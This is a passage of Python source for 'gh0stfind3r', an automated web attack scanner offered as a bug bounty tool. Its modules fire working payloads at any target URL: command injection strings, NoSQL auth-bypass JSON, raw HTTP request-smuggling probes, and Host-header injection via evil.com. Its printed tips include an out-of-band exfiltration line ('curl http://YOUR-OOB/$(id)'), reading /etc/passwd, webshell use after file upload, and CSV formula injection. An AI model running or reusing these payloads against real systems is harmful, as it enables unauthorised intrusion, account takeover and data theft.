        ("|echo gh0st_pwned_cmd", "gh0st_pwned_cmd"),
        ("&echo gh0st_pwned_cmd", "gh0st_pwned_cmd"),
        ("`echo gh0st_pwned_cmd`", "gh0st_pwned_cmd"),
        ("$(echo gh0st_pwned_cmd)", "gh0st_pwned_cmd"),
        # Windows
        ("|echo gh0st_pwned_cmd", "gh0st_pwned_cmd"),
        ("&echo gh0st_pwned_cmd", "gh0st_pwned_cmd"),
        # Newline injection
        ("%0aecho%20gh0st_pwned_cmd", "gh0st_pwned_cmd"),
    ]

    # Time-based (blind)
    time_payloads = [
        (";sleep 3", 3),
        ("|sleep 3", 3),
        ("$(sleep 3)", 3),
        ("& ping -c 3 127.0.0.1 &", 3),
    ]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    # Look for file/exec-like params first
    exec_params = [p for p in params if any(k in p.lower() for k in
                   ["cmd","exec","command","run","ping","host","ip","file",
                    "name","query","path","process","system","shell","port"])]
    test_params = exec_params if exec_params else list(params.keys())

    if not test_params:
        info("No URL params. Try: ?cmd=ls or ?host=127.0.0.1")
        return

    info(f"Testing {len(test_params)} param(s) for command injection...")
    for param in test_params[:5]:
        # Output-based
        for payload, expected in cmd_payloads[:4]:
            new_params = {**params, param: [payload]}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True))
            )
            c, h, body = http_get(test_url, 6)
            if expected in body:
                vuln("CRITICAL", f"Command Injection! Param '{param}'\n"
                     f"       Payload: {payload}\n"
                     f"       CWE-78: OS Command Injection\n"
                     f"       Next: ;cat /etc/passwd  or  ;id  or  ;ls /")

        # Time-based (blind)
        for payload, delay in time_payloads[:2]:
            new_params = {**params, param: [payload]}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True))
            )
            t0 = time.time()
            http_get(test_url, delay + 5)
            elapsed = time.time() - t0
            if elapsed >= delay * 0.8:
                vuln("CRITICAL", f"Blind Command Injection! Param '{param}' — {elapsed:.1f}s delay\n"
                     f"       Payload: {payload}\n"
                     f"       CWE-78: OS Command Injection (time-based blind)")

    tip("Blind CMDi: use OOB — ;curl http://YOUR-OOB/$(id)")
    tip("Bypass filters: ${IFS}, {cat,/etc/passwd}, 'c'a't', \\n, semicolons")


# ════════════════════════════════════════════════════════════
#  MODULE G — NOSQL INJECTION  [CWE-943]
# ════════════════════════════════════════════════════════════
def module_nosqli(url):
    section("NoSQL Injection  [CWE-943]")

    # MongoDB injection payloads
    nosql_payloads_url = [
        "[$ne]=1",           # $ne operator bypass
        "[$gt]=",            # $gt operator
        "[$regex]=.*",       # regex bypass
        "[$where]=1",        # JS execution
        "[$nin][]=x",        # $nin operator
    ]

    nosql_payloads_json = [
        '{"username":{"$ne":"x"},"password":{"$ne":"x"}}',
        '{"username":{"$regex":".*"},"password":{"$regex":".*"}}',
        '{"username":{"$gt":""},"password":{"$gt":""}}',
        '{"username":"admin","password":{"$ne":"wrong"}}',
        '{"$where":"sleep(1000)"}',
    ]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    auth_params = [p for p in params if any(k in p.lower() for k in
                   ["user","username","email","pass","password","login","auth","token"])]
    test_params = auth_params or list(params.keys())

    info("Testing NoSQL injection in URL params...")
    for param in test_params[:4]:
        for payload in nosql_payloads_url[:3]:
            test_url = f"{url.split('?')[0]}?{param}{payload}"
            c, h, body = http_get(test_url, 6)
            if c == 200 and len(body) > 50:
                # Compare with baseline
                c0, _, base = http_get(url, 5)
                if abs(len(body) - len(base)) > 100 or "token" in body.lower():
                    vuln("HIGH", f"Possible NoSQL injection in '{param}' with: {payload}\n"
                         f"       CWE-943: MongoDB operator injection\n"
                         f"       Impact: Auth bypass, data exfiltration")

    # JSON body injection
    info("Testing NoSQL injection in JSON body...")
    login_paths = ["/login", "/api/login", "/api/auth", "/auth", "/signin", "/api/signin"]
    for path in login_paths:
        ep = url.rstrip("/") + path
        c, _, _ = http_get(ep, 4)
        if c in [200, 405]:
            for jp in nosql_payloads_json[:3]:
                c2, _, b2 = http_post(ep, jp, content_type="application/json")
                if c2 == 200 and ("token" in b2.lower() or "success" in b2.lower() or "welcome" in b2.lower()):
                    vuln("CRITICAL", f"NoSQL Auth Bypass on {ep}!\n"
                         f"       Payload: {jp}\n"
                         f"       CWE-943: NoSQL Query Manipulation")

    tip("NoSQL auth bypass: username[$ne]=x&password[$ne]=x in form fields")
    tip("MongoDB JS injection: {$where: 'sleep(5000)'} → time-based blind")


# ════════════════════════════════════════════════════════════
#  MODULE H — JWT ATTACKS  [CWE-347]
# ════════════════════════════════════════════════════════════
def module_jwt(url):
    section("JWT Security Testing  [CWE-347]")
    import base64

    # Capture tokens from cookies / auth headers
    c, h, body = http_get(url, 8)
    cookies_raw = h.get("Set-Cookie", h.get("set-cookie", ""))
    auth_raw    = h.get("Authorization", h.get("authorization", ""))
    all_text     = cookies_raw + " " + auth_raw + " " + body

    jwt_pattern = r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'
    tokens = re.findall(jwt_pattern, all_text)

    if tokens:
        tok = tokens[0]
        info(f"JWT found: {yellow(tok[:60])}...")
        _analyze_jwt(tok)
    else:
        info("No JWT found automatically. Provide one manually or log in first.")
        tip("After login, check: Cookie, Authorization header, localStorage")

    # Common weak secrets to test
    tip("JWT weak secret bruteforce:")
    tip("  hashcat -a 0 -m 16500 '<JWT>' /usr/share/wordlists/rockyou.txt")
    tip("  Tool: jwt_tool — github.com/ticarpi/jwt_tool")

    tip("\nJWT attack checklist:")
    checks = [
        "alg:none — change algorithm to 'none', remove signature",
        "RS256→HS256 — use public key as HMAC secret",
        "Weak secret — bruteforce with jwt_tool / hashcat",
        "Expired token — server still accepts?",
        "kid injection — kid header path traversal or SQLi",
        "jku/x5u spoofing — point to attacker-controlled JWK set",
        "Claim tampering — change sub/role/admin without re-signing",
    ]
    for c in checks:
        tip(f"  → {c}")

def _analyze_jwt(token):
    import base64
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return
        # Decode header
        header_b64 = parts[0] + "=="
        header = json.loads(base64.urlsafe_b64decode(header_b64).decode("utf-8", errors="ignore"))
        alg = header.get("alg","").upper()
        kid = header.get("kid","")

        ok(f"JWT header: {header}")
        info(f"Algorithm: {bold(alg)}")

        if alg == "NONE" or alg == "":
            vuln("CRITICAL", "JWT uses 'none' algorithm — signature not verified!")
        if "HS" in alg:
            warn("HMAC algorithm — test for weak secret with hashcat")
        if kid:
            warn(f"kid header present: '{kid}' — test for path traversal / SQLi in kid")
            if "/" in kid or ".." in kid:
                vuln("HIGH", f"JWT kid appears to contain path: {kid} — possible LFI in signing key")

        # Decode payload
        payload_b64 = parts[1] + "=="
        payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8", errors="ignore"))
        ok(f"JWT payload: {payload}")

        # Check expiry
        exp = payload.get("exp", 0)
        if exp:
            if exp < time.time():
                warn("JWT is expired — does server still accept it?")
                vuln("MEDIUM", "Server may accept expired JWT tokens — test auth bypass")
            else:
                ok(f"JWT expires: {datetime.fromtimestamp(exp)}")

        # Check for sensitive claims
        for key in ["admin","role","is_admin","superuser","scope","privilege"]:
            if key in payload:
                warn(f"Sensitive claim in JWT: '{key}' = {payload[key]} — try tampering")

        # Empty signature check
        if parts[2] == "":
            vuln("CRITICAL", "JWT signature is empty — 'none' algorithm bypass!")

    except Exception as e:
        warn(f"JWT parse error: {e}")


# ════════════════════════════════════════════════════════════
#  MODULE I — HTTP REQUEST SMUGGLING  [CWE-444]
# ════════════════════════════════════════════════════════════
def module_smuggling(url):
    section("HTTP Request Smuggling Detection  [CWE-444]")

    parsed = urllib.parse.urlparse(url)
    host   = parsed.netloc or parsed.path
    port   = 443 if "https" in url else 80

    info("Testing for TE.CL and CL.TE smuggling indicators...")

    # CL.TE detection: ambiguous Content-Length vs Transfer-Encoding
    cl_te_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )

    # TE.CL detection
    te_cl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "X\r\n"
        "0\r\n"
        "\r\n"
    )

    smuggle_variants = [
        ("CL.TE", cl_te_payload),
        ("TE.CL", te_cl_payload),
    ]

    for variant, raw in smuggle_variants:
        try:
            if "https" in url:
                sock = socket.create_connection((host.split(":")[0], 443), timeout=8)
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
            else:
                sock = socket.create_connection((host.split(":")[0], 80), timeout=8)

            sock.sendall(raw.encode())
            response = sock.recv(4096).decode("utf-8", errors="ignore")
            sock.close()

            if response:
                code = response.split(" ")[1] if len(response.split(" ")) > 1 else "?"
                info(f"  {variant} probe → HTTP {code}")
                if "400" in response and variant == "TE.CL":
                    warn(f"Possible {variant} vulnerability (400 on ambiguous request)")
                elif "timeout" in response.lower():
                    warn(f"Possible {variant} vulnerability (server hung on request)")
        except Exception as e:
            info(f"  {variant} probe failed: {str(e)[:40]}")

    tip("Use Burp Suite → HTTP Request Smuggler extension for accurate smuggling detection")
    tip("Tool: smuggler.py — github.com/defparam/smuggler")
    tip("Impact: bypass front-end security controls, cache poisoning, session hijacking")


# ════════════════════════════════════════════════════════════
#  MODULE J — OAUTH / SSO MISCONFIGS  [CWE-601 / CWE-287]
# ════════════════════════════════════════════════════════════
def module_oauth(url):
    section("OAuth & SSO Misconfiguration Testing  [CWE-601]")

    c, h, body = http_get(url, 8)
    body_l = body.lower()

    # Detect OAuth presence
    oauth_sigs = ["oauth","oauth2","openid","sso","saml","oidc","client_id",
                  "response_type=code","scope=openid","grant_type"]
    has_oauth = any(sig in body_l for sig in oauth_sigs)

    if has_oauth:
        info("OAuth/SSO detected on target")

    # Check for common OAuth endpoints
    oauth_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/authorize", "/oauth2/authorize",
        "/oauth/token", "/oauth2/token",
        "/auth/callback", "/oauth/callback",
        "/sso", "/saml/metadata", "/saml2/metadata",
        "/api/oauth2/token", "/.well-known/jwks.json",
    ]

    found_endpoints = []
    info("Probing OAuth/OIDC endpoints...")
    for path in oauth_paths:
        ep = url.rstrip("/") + path
        c2, h2, b2 = http_get(ep, 5)
        if c2 == 200:
            ok(f"Found: {cyan(ep)}")
            found_endpoints.append(ep)
            if "jwks" in path or "openid" in path:
                try:
                    data = json.loads(b2)
                    info(f"  OIDC Config: {list(data.keys())[:5]}")
                except:
                    pass

    # OAuth attack checklist
    tip("OAuth attack checklist:")
    attacks = [
        ("redirect_uri bypass",     "Try: redirect_uri=https://evil.com — steal auth code"),
        ("state param missing",     "No state param → CSRF on OAuth flow"),
        ("implicit flow",           "response_type=token → token in URL fragment (log leaks)"),
        ("open redirect chain",     "redirect_uri + open redirect → token theft"),
        ("code reuse",              "Try replaying same auth code twice"),
        ("PKCE missing",            "No code_challenge → auth code interception"),
        ("scope escalation",        "Add admin/write scopes beyond granted permissions"),
        ("IDtoken manipulation",    "Tamper sub/email claim in ID token"),
        ("SAML signature wrapping", "Wrap signed SAML assertion around attacker data"),
    ]
    for name, desc in attacks:
        tip(f"  [{cyan(name)}] {desc}")


# ════════════════════════════════════════════════════════════
#  MODULE K — FILE UPLOAD TESTING  [CWE-434]
# ════════════════════════════════════════════════════════════
def module_file_upload(url):
    section("File Upload Vulnerability Testing  [CWE-434]")

    # Find upload endpoints
    upload_paths = [
        "/upload", "/uploads", "/file-upload", "/api/upload",
        "/api/files", "/media/upload", "/images/upload",
        "/documents/upload", "/attachments", "/avatar",
        "/profile/avatar", "/api/v1/upload", "/wp-json/wp/v2/media",
    ]

    c0, h0, body0 = http_get(url, 8)
    upload_forms = re.findall(r'<input[^>]+type=["\']file["\'][^>]*>', body0, re.IGNORECASE)

    if upload_forms:
        info(f"File upload input found on main page: {len(upload_forms)} form(s)")
        vuln("MEDIUM", "File upload form detected — test for upload bypass\n"
             f"       CWE-434: Unrestricted Upload of File with Dangerous Type")

    info("Probing upload endpoints...")
    found_uploads = []
    for path in upload_paths:
        ep = url.rstrip("/") + path
        c, h, b = http_get(ep, 5)
        if c in [200, 405, 401, 403]:
            if c == 200:
                vuln("MEDIUM", f"Upload endpoint found [{c}]: {cyan(ep)}")
            else:
                warn(f"Upload endpoint exists [{c}]: {ep}")
            found_uploads.append(ep)

    tip("File upload bypass techniques:")
    bypasses = [
        ("Extension bypass",   "file.php → file.php.jpg, file.phtml, file.php5, file.phar"),
        ("MIME bypass",        "Change Content-Type to image/jpeg while keeping .php extension"),
        ("Double extension",   "file.jpg.php — some servers execute last extension"),
        ("Null byte",          "file.php%00.jpg — old PHP/servers truncate at null"),
        ("Case bypass",        "file.PhP, file.PHP, file.pHp"),
        ("Magic bytes",        "Prepend GIF89a; to PHP webshell → GIF+PHP polyglot"),
        ("Path in filename",   "../../../var/www/html/shell.php as filename"),
        ("Archive bypass",     "ZIP with symlink → path traversal; LFI to RCE chain"),
        ("SVG XSS",            "<svg onload=alert(1)> in SVG file — stored XSS"),
        ("XXE via XML/SVG",    "SVG with DOCTYPE + ENTITY → XXE"),
        ("CSV injection",      "=cmd|'/C calc.exe'!A0 in CSV cells → formula injection"),
    ]
    for name, desc in bypasses:
        tip(f"  [{cyan(name)}] {desc}")

    tip("\nWebshell after upload: ?cmd=id  or  /uploads/shell.php?c=id")
    tip("Tool: fuxploider — github.com/almandin/fuxploider")


# ════════════════════════════════════════════════════════════
#  MODULE L — HOST HEADER INJECTION  [CWE-113]
# ════════════════════════════════════════════════════════════
def module_host_header_injection(url):
    section("Host Header Injection  [CWE-113]")

    parsed = urllib.parse.urlparse(url)
    real_host = parsed.netloc

    # Payloads
    evil_hosts = [
        "evil.com",
        "evil.com:80",
        f"{real_host}.evil.com",
        f"evil.com#{real_host}",
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
    ]

    info("Testing Host header injection...")
    baseline_code, _, baseline_body = http_get(url, 8)

    for evil_host in evil_hosts[:4]:
        c, h, body = http_get(url, 6, {"Host": evil_host})
        if evil_host in body:
            vuln("HIGH", f"Host header reflected in response! Host: {evil_host}\n"
                 f"       CWE-113: HTTP Response Splitting\n"
                 f"       Impact: Password reset poisoning, cache poisoning, SSRF")
        if c != baseline_code and abs(len(body) - len(baseline_body)) > 200:
            warn(f"Host: {evil_host} → different response ({c}) — investigate")

    # Password reset poisoning test
    reset_paths = ["/forgot-password", "/password-reset", "/reset", "/forgot",
                   "/account/password-reset", "/api/auth/forgot-password"]
    info("Testing Host injection in password reset...")
    for path in reset_paths:
        ep = url.rstrip("/") + path
        c, h, b = http_get(ep, 4)
        if c in [200, 302]:
            warn(f"Password reset endpoint found: {ep}")
            tip(f"  Test: POST {ep} with Host: evil.com and valid email")
            tip("  If reset link contains evil.com → Host Header Injection confirmed")
            vuln("HIGH", f"Password reset endpoint + Host injection = Account Takeover risk\n"
                 f"       Send reset with Host: evil.com → user clicks → you capture token")

    # X-Forwarded-Host / X-Host bypass
    for override_header in ["X-Forwarded-Host","X-Host","X-Forwarded-Server","X-HTTP-Host-Override"]:
        c, h, body = http_get(url, 6, {override_header: "evil.com"})
        if "evil.com" in body:
            vuln("HIGH", f"Host override via {override_header} header reflected in response!")


# ════════════════════════════════════════════════════════════
#  MODULE M — INFORMATION DISCLOSURE  [CWE-200]
# ════════════════════════════════════════════════════════════
def module_info_disclosure(url, domain):
    section("Information Disclosure  [CWE-200]")

    # Error-triggering URLs
    error_urls = [
        url + "/gh0st_nonexistent_12345",
        url + "/%00",
        url + "/<invalid>",
        url + "/" + "A"*5000,
        url + "/.git/config",
        url + "/.svn/entries",
        url + "/WEB-INF/web.xml",
        url + "/META-INF/MANIFEST.MF",
        url + "/app/config/parameters.yml",
        url + "/config/database.yml",
        url + "/application.properties",
        url + "/settings.py",
        url + "/local.settings.json",
        url + "/.npmrc",
        url + "/.dockerignore",
        url + "/docker-compose.yml",
        url + "/Dockerfile",
        url + "/package.json",
        url + "/composer.json",
        url + "/Gemfile",
        url + "/requirements.txt",
    ]

    info("Scanning for information disclosure files...")
    leaks_found = []

    for eu in error_urls:
        c, h, body = http_get(eu, 5)
        if c == 200 and body:
            fname = eu.split("/")[-1] or eu
            size  = len(body)
            # Check for sensitive content
            sensitive_patterns = [
                ("password","Password field"),("secret","Secret key"),
                ("api_key","API key"),("private","Private key"),
                ("database","Database config"),("host=","DB host"),
                ("[core]","Git config"),("stack trace","Stack trace"),
                ("SQLException","SQL error trace"),("Traceback","Python traceback"),
                ("at java","Java stack trace"),("Exception in","Java exception"),
                ("Warning: include","PHP warning"),("Fatal error","PHP fatal error"),
                ("db_password","Database password"),("DB_PASS","Database password"),
            ]
            for pattern, label in sensitive_patterns:
                if pattern.lower() in body.lower():
                    vuln("HIGH", f"Info disclosure [{label}]: {cyan(eu)} ({size}B)\n"
                         f"       CWE-200: Exposure of Sensitive Information")
                    leaks_found.append(eu)
                    break
            else:
                if size > 100:
                    ok(f"Accessible [{c}]: {eu} ({size}B)")

    # Error page analysis
    info("Triggering error pages for tech disclosure...")
    for trigger in [url + "/gh0st", url + "/%3Cscript%3E"]:
        c, h, body = http_get(trigger, 5)
        if c in [404, 500, 400, 403]:
            tech_sigs = {
                "Apache/": "Apache version",
                "nginx/": "Nginx version",
                "PHP/": "PHP version",
                "ASP.NET": "ASP.NET",
                "Powered by": "Framework disclosure",
                "Ruby on Rails": "Rails",
                "Django": "Django",
                "Flask": "Flask",
                "Express": "Express.js",
                "Tomcat": "Apache Tomcat version",
                "Jetty": "Jetty server",
            }
            for sig, label in tech_sigs.items():
                if sig in body:
                    vuln("LOW", f"Tech disclosure in {c} page: {label}")


# ════════════════════════════════════════════════════════════
#  MODULE N — API SECURITY (OWASP API Top 10)
# ════════════════════════════════════════════════════════════
def module_api_security(url):
    section("API Security — OWASP API Top 10")

    owasp_api = {
        "API1": "Broken Object Level Authorization (BOLA/IDOR)",
        "API2": "Broken User Authentication",
        "API3": "Broken Object Property Level Authorization",
        "API4": "Unrestricted Resource Consumption",
        "API5": "Broken Function Level Authorization",
        "API6": "Unrestricted Access to Sensitive Business Flows",
        "API7": "Server-Side Request Forgery",
        "API8": "Security Misconfiguration",
        "API9": "Improper Inventory Management",
        "API10": "Unsafe Consumption of APIs",
    }

    c, h, body = http_get(url, 8)
    body_l = body.lower()
    ct = (h.get("Content-Type") or h.get("content-type") or "").lower()

    # Check if this is an API
    is_api = "json" in ct or "api" in url or "/v1" in url or "/v2" in url

    section("API1 – BOLA / IDOR Testing")
    idor_paths = [
        ("/api/users/1",   "/api/users/2"),
        ("/api/user/1",    "/api/user/2"),
        ("/api/orders/1",  "/api/orders/2"),
        ("/api/profile/1", "/api/profile/2"),
    ]
    for path1, path2 in idor_paths:
        c1, _, b1 = http_get(url.rstrip("/")+path1, 5)
        c2, _, b2 = http_get(url.rstrip("/")+path2, 5)
        if c1 == 200 and c2 == 200:
            vuln("HIGH", f"BOLA risk: Both {path1} and {path2} accessible without auth\n"
                 f"       OWASP API1: Broken Object Level Authorization\n"
                 f"       Next: Log in as User B, access User A's ID")

    section("API2 – Auth Testing")
    # Test endpoints without auth
    protected_paths = ["/api/admin", "/api/users", "/api/config", "/api/keys"]
    for path in protected_paths:
        ep = url.rstrip("/") + path
        c, _, b = http_get(ep, 4)
        if c == 200 and b:
            vuln("CRITICAL", f"Unauthenticated API access [{c}]: {ep}\n"
                 f"       OWASP API2: Broken User Authentication")

    section("API3 – Excessive Data Exposure")
    if is_api:
        # Look for sensitive fields in responses
        sensitive_fields = ["password","ssn","credit_card","card_number","cvv",
                            "secret","private_key","api_key","token","auth_token",
                            "social_security","bank_account","pin"]
        for field in sensitive_fields:
            if field in body_l:
                vuln("HIGH", f"Sensitive field '{field}' in API response\n"
                     f"       OWASP API3: Excessive Data Exposure\n"
                     f"       Impact: Mass data leakage")

    section("API4 – Rate Limiting")
    if is_api:
        endpoint = url if "api" in url else url.rstrip("/")+"/api/v1/users"
        codes = []
        for _ in range(20):
            c, _, _ = http_get(endpoint, 3)
            codes.append(c)
        if 429 not in codes:
            vuln("MEDIUM", f"No rate limiting on {endpoint}\n"
                 f"       OWASP API4: Unrestricted Resource Consumption\n"
                 f"       Impact: DoS, enumeration, brute force")

    section("API5 – Broken Function Level Auth")
    admin_funcs = [
        ("/api/admin/users", "GET"),
        ("/api/admin/delete", "DELETE"),
        ("/api/admin/export", "GET"),
        ("/api/users/delete", "DELETE"),
        ("/api/v1/admin", "GET"),
    ]
    for path, method in admin_funcs:
        ep = url.rstrip("/") + path
        try:
            req = urllib.request.Request(ep, method=method, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=4) as r:
                if r.getcode() == 200:
                    vuln("CRITICAL", f"BFLA: Admin function accessible [{method}] {ep}\n"
                         f"       OWASP API5: Broken Function Level Authorization")
        except:
            pass

    # Print all OWASP API checks summary
    section("OWASP API Top 10 Coverage")
    for api_id, name in owasp_api.items():
        print(f"  {cyan(api_id)}: {name}")


# ════════════════════════════════════════════════════════════
#  MODULE O — CWE/CVE REPORT GENERATOR
# ════════════════════════════════════════════════════════════
def generate_cwe_report(findings, output_dir, domain):
    section("CWE/CVE Mapped Report")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rf = os.path.join(output_dir, f"cwe_report_{domain}_{ts}.txt")

    owasp_top10 = {
        "A01": ("Broken Access Control",       ["idor","bola","bfla","priv_esc","missing_auth"]),
        "A02": ("Cryptographic Failures",       ["weak_crypto","ssl","heartbleed","hardcoded"]),
        "A03": ("Injection",                    ["sqli","xss","cmd_inject","ssti","nosqli","crlf","lfi"]),
        "A04": ("Insecure Design",              ["business","race","mass_assign"]),
        "A05": ("Security Misconfiguration",    ["cors","clickjack","header","info_disc","api"]),
        "A06": ("Vulnerable Components",        ["cve","cwe","log4shell","struts","drupal"]),
        "A07": ("Auth Failures",                ["weak_auth","jwt","oauth","ratelimit","csrf"]),
        "A08": ("Integrity Failures",           ["deserial","ci_cd","prototype_poll"]),
        "A09": ("Logging Failures",             ["log_inject","info_disc"]),
        "A10": ("SSRF",                         ["ssrf","xxe"]),
    }

    with open(rf, "w") as f:
        f.write("=" * 70 + "\n")
        f.write("  gh0stfind3r — CVE/CWE/OWASP Vulnerability Report\n")
        f.write(f"  Author   : GHOST BEROK\n")
        f.write(f"  Target   : {domain}\n")
        f.write(f"  Date     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 70 + "\n\n")

        total = sum(len(v) for v in findings.values())
        f.write(f"Total Findings: {total}\n")
        for sev, items in findings.items():
            f.write(f"  [{sev}] {len(items)}\n")

        f.write("\n\n=== FINDINGS WITH CWE MAPPING ===\n\n")
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            for finding in findings[sev]:
                f.write(f"[{sev}] {finding['title']}\n")
                # Try to map to CWE
                title_l = finding['title'].lower()
                for vuln_type, (cwe_id, cwe_name) in CWE_MAP.items():
                    if vuln_type in title_l or cwe_id.lower() in title_l:
                        f.write(f"  Mapped to: {cwe_id} — {cwe_name}\n")
                        break
                if finding.get("detail"):
                    f.write(f"  Detail: {finding['detail']}\n")
                f.write("\n")

        f.write("\n=== OWASP TOP 10 COVERAGE ===\n\n")
        for owasp_id, (name, _) in owasp_top10.items():
            f.write(f"  {owasp_id}: {name}\n")

        f.write("\n\n=== CVE REFERENCE DATABASE (Checked) ===\n\n")
        for cve_id, cve in CVE_DB.items():
            f.write(f"  {cve_id}: {cve['name']}\n")
            f.write(f"    Severity : {cve['severity']}\n")
            f.write(f"    Affected : {cve.get('affected','')}\n")
            f.write(f"    Fix      : {cve.get('fix','See advisory')}\n\n")

    ok(f"CWE/CVE Report saved: {green(rf)}")
    return rf


# ════════════════════════════════════════════════════════════
#  ALL-IN-ONE RUNNER  (import into main gh0stfind3r or run standalone)
# ════════════════════════════════════════════════════════════
def run_all_extended_modules(url, domain, output_dir="./gh0st_output"):
    os.makedirs(output_dir, exist_ok=True)

    module_cve_scanner(url, domain)
    module_ssti(url)
    module_crlf(url)
    module_prototype_pollution(url)
    module_deserialization(url)
    module_cmd_injection(url)
    module_nosqli(url)
    module_jwt(url)
    module_smuggling(url)
    module_oauth(url)
    module_file_upload(url)
    module_host_header_injection(url)
    module_info_disclosure(url, domain)
    module_api_security(url)
    generate_cwe_report(FINDINGS, output_dir, domain)


# ── Standalone mode ─────────────────────────────────────────


def interactive_menu():
    print_banner()
    print(f"  {mag('Interactive Mode — Select options below')}\n")

    target = input(f"  {cyan('Enter target URL or IP')} (e.g. https://target.com): ").strip()
    if not target:
        print(red("No target provided. Exiting."))
        sys.exit(1)

    print(f"\n  {yellow('Select scan type:')}")
    print(f"  {cyan('1')}. Quick Scan  (headers, fingerprint, dirs, ssl)")
    print(f"  {cyan('2')}. Full Scan   (ALL modules – takes 10-30 min)")
    print(f"  {cyan('3')}. Recon Only  (whois, subdomains, portscan)")
    print(f"  {cyan('4')}. Exploit     (sqli, xss, lfi, ssrf, xxe, idor)")
    print(f"  {cyan('5')}. Custom      (choose modules manually)")
    print(f"  {cyan('6')}. Check Tools (see what's installed)")

    choice = input(f"\n  {cyan('Choice [1-6]:')} ").strip()

    module_map = {
        "1": "fingerprint,headers,dirs,ssl,csrf",
        "2": "all",
        "3": "recon,subdomains,portscan,js,ssl",
        "4": "sqli,xss,lfi,ssrf,xxe,idor,ratelimit,business",
        "6": "check",
    }

    if choice == "6":
        check_tools()
        sys.exit(0)
    elif choice == "5":
        print(f"\n  Available: recon,subdomains,portscan,fingerprint,headers,dirs,")
        print(f"             js,params,sqli,xss,lfi,xxe,ssrf,ssl,nuclei,nikto,")
        print(f"             idor,csrf,ratelimit,business,ai")
        modules_str = input(f"\n  {cyan('Enter modules (comma-separated):')} ").strip()
    else:
        modules_str = module_map.get(choice, "all")

    output = input(f"  {cyan('Output dir')} [./gh0st_output]: ").strip() or "./gh0st_output"

    return target, modules_str, output

# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    global LOG_FILE

    parser = argparse.ArgumentParser(
        description="gh0stfind3r v3.0 — Automated Bug Bounty Hunting Tool by GHOST BEROK",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  gh0stfind3r -u https://example.com
  gh0stfind3r -u 'https://example.com?id=1'
  gh0stfind3r -ip 192.168.1.1
  gh0stfind3r -u https://example.com --modules sqli,xss,lfi
  gh0stfind3r -u https://example.com --quick
  gh0stfind3r -u https://example.com --full
  gh0stfind3r --check-tools
  gh0stfind3r --menu
        """
    )
    parser.add_argument("-u",   "--url",         help="Target URL")
    parser.add_argument("-ip",  "--ip",          help="Target IP")
    parser.add_argument("-o",   "--output",      default="./gh0st_output", help="Output directory")
    parser.add_argument("--modules",             default="all",
                        help="Comma-separated modules:\n"
                             "recon,subdomains,portscan,fingerprint,headers,\n"
                             "dirs,js,params,sqli,xss,lfi,xxe,ssrf,ssl,\n"
                             "nuclei,nikto,idor,csrf,ratelimit,business,ai")
    parser.add_argument("--quick",               action="store_true", help="Quick scan (fast, key modules only)")
    parser.add_argument("--full",                action="store_true", help="Full scan (all modules)")
    parser.add_argument("--recon",               action="store_true", help="Recon only (no exploitation)")
    parser.add_argument("--exploit",             action="store_true", help="Exploit modules only")
    parser.add_argument("--check-tools",         action="store_true", help="Check installed tools")
    parser.add_argument("--menu",                action="store_true", help="Interactive menu mode")
    parser.add_argument("--no-banner",           action="store_true", help="Skip banner")
    parser.add_argument("--threads",             type=int, default=20, help="Thread count (default: 20)")

    args = parser.parse_args()

    if args.menu or (not args.url and not args.ip and not args.check_tools):
        raw_target, modules_str, output_dir = interactive_menu()
    else:
        if not args.no_banner:
            print_banner()
        raw_target  = args.url or args.ip or ""
        output_dir  = args.output

        if args.quick:
            modules_str = "fingerprint,headers,dirs,ssl,csrf,js"
        elif args.full:
            modules_str = "all"
        elif args.recon:
            modules_str = "recon,subdomains,portscan,fingerprint,ssl"
        elif args.exploit:
            modules_str = "sqli,xss,lfi,xxe,ssrf,idor,csrf,ratelimit,business"
        else:
            modules_str = args.modules

    if args.check_tools:
        check_tools()
        sys.exit(0)

    if not raw_target:
        print(red("No target! Use -u URL or -ip IP or --menu"))
        sys.exit(1)

    os.makedirs(output_dir, exist_ok=True)
    LOG_FILE = os.path.join(output_dir, f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    target_url, domain, ip = parse_target(raw_target)

    print(f"\n  {cyan('Target')}  : {bold(target_url)}")
    print(f"  {cyan('Domain')}  : {bold(domain)}")
    print(f"  {cyan('IP')}      : {bold(ip)}")
    print(f"  {cyan('Modules')} : {bold(modules_str)}")
    print(f"  {cyan('Output')}  : {bold(output_dir)}")
    print(f"  {cyan('Log')}     : {bold(LOG_FILE)}")
    print(f"  {cyan('Started')} : {bold(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}\n")

    mods = [m.strip().lower() for m in modules_str.split(",")] if modules_str != "all" else ["all"]
    run_all = "all" in mods

    def should_run(name):
        return run_all or name in mods

    open_ports   = []
    subdomains   = []
    headers      = {}
    header_issues= []

    try:
        if should_run("recon"):        module_whois(domain, ip)
        if should_run("subdomains"):   subdomains   = module_subdomains(domain)
        if should_run("portscan"):     open_ports   = module_portscan(ip, domain)
        if should_run("fingerprint"):  headers      = module_fingerprint(target_url, domain)
